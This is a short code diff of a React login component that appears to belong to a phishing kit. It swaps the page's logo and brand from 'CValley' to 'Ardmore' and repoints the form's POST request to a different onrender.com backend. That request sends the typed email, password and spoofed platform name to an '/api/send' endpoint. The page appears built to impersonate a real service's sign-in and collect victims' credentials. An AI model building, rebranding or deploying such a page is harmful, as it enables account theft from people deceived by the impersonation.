@@ -2,7 +2,7 @@ import React from 'react';
 import './home.css'
 
 import logo from './logo.png';
-
+import ardmore from './ardmore.png';
 import { useState } from 'react';
 import axios from 'axios';
 
@@ -12,7 +12,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("CValley")
+    const[platform, setPlatform] = useState("Ardmore")
 
     const[showError, setShowError] = useState(false);
 
@@ -21,7 +21,7 @@ function Home(){
 
 
         try {
-            const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
+            const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
                 email:email,
                 password:password,
                 platform:platform
@@ -58,7 +58,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={logo} className="mylogo" />
+                <img src={ardmore} className="mylogo" />
 
                 </div>
 
